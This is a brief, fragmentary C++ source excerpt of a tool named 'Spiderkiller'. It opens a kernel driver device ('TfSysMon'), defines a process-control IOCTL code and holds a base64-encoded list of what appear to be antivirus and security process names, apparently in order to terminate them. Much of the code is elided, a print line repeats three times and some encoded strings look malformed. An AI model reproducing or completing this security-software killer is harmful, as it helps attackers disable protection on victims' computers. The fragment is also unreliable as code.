...
#define DeviceName "\\\\.\\TfSysMon"
#define TPROCESS_CODE  0xB4A00404
...
int main(const int argc, char ** argv) {
    ...
    "MzYwZW50Y2xpZW50LmV4ZQ==","CUVFQQ1JUUC5leGU=","WUVFQcm90ZWN0LmV4ZQ==","UVFQQ1RyYXkuZXhl"
    };
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    ...
    //
   /* unsigned int int_code = 3030385668;
